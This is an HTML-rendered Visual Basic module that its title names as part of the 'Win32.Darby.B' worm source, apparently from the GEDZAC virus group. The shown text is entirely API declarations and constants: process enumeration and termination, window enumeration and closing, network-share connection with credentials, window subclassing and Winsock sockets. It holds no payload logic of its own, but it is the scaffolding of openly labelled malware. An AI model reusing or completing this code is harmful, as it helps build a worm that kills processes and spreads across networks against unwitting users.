<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Win32.Darby.B - GEDZAC.bas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Bmod"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumProcesses</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
   </span><span class="sc6">(</span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">lpidProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
      </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetModuleFileNameExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
   </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
      </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
   </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">lphModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
      </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WNetAddConnection2</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"mpr.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WNetAddConnection2A"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc6">(</span><span class="sc7">lpNetResource</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">NETRESOURCE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpPassword</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpUserName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WNetCancelConnection2</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"mpr.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WNetCancelConnection2A"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">fForce</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">NETRESOURCE</span><span class="sc0">
</span><span class="sc7">dwScope</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwDisplayType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwUsage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpLocalName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">lpRemoteName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpComment</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpProvider</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">RESOURCETYPE_DISK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">CONNECT_UPDATE_PROFILE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"PostMessageA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_CLOSE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H10</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumWindows</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpfn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowText</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetWindowTextA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpString</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cch</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetVersionExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lpVersionInformation</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">OSVERSIONINFO</span><span class="sc0">
</span><span class="sc7">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwMajorVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwMinorVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwBuildNumber</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwPlatformId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">szCSDVersion</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Process32First</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hSnapshot</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lppe</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Process32Next</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hSnapshot</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lppe</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CreateToolhelp32Snapshot</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lFlgas</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">TH32CS_SNAPPROCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">MAX_PATH</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">PROCESSENTRY32</span><span class="sc0">
</span><span class="sc7">dwSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">cntUsage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">th32ProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">th32DefaultHeapID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">th32ModuleID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">cntThreads</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">th32ParentProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">pcPriClassBase</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">szexeFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">MAX_PATH</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSADescription_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WSASYS_Status_Len</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">

</span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"CallWindowProcA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpPrevWndFunc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Msg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"SetWindowLongA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nIndex</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwNewLong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">4</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H80</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_WRITE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H2</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H10</span><span class="sc6">&amp;:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H20</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">sockaddr_size</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

